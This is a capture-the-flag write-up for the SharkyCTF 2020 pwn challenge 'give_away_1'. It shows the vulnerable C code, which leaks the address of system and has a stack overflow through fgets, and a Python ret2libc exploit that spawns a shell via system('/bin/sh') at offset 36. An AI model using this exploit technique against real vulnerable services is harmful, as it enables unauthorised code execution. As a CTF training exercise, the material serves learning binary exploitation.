
## give_away_1
### Description

> Make good use of this gracious give away.
>
> Creator: Hackhim

### Attachment

[give_away_1](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/SharkyCTF-2020/pwn/give_away_1/give_away_1)
, 
[libc.so.6](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/SharkyCTF-2020/pwn/give_away_1/libc.so.6)


### Analysis

Another warm up task

```c
int main(int argc, const char **argv, const char **envp){
  init_buffering(&argc);
  printf("Give away: %p\n", &system);
  vuln();
  return 0;
}
char *vuln(){
  char s; 
  return fgets(&s, 50, stdin);
}
```

> buffer overflow, `system` in libc leaked, 32bit elf

### Solution

ret2libc

```python
ru('Give away: ')
system = eval(rc(10))
libcbase = system - libc.sym['system']
binsh  = libcbase + libc.search('/bin/sh').next()
# ret2libc
offset = 36
payload = 'A'*offset
payload += p32(system) + p32(0) + p32(binsh)
sl(payload)
```


### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/SharkyCTF-2020/pwn/give_away_1) 


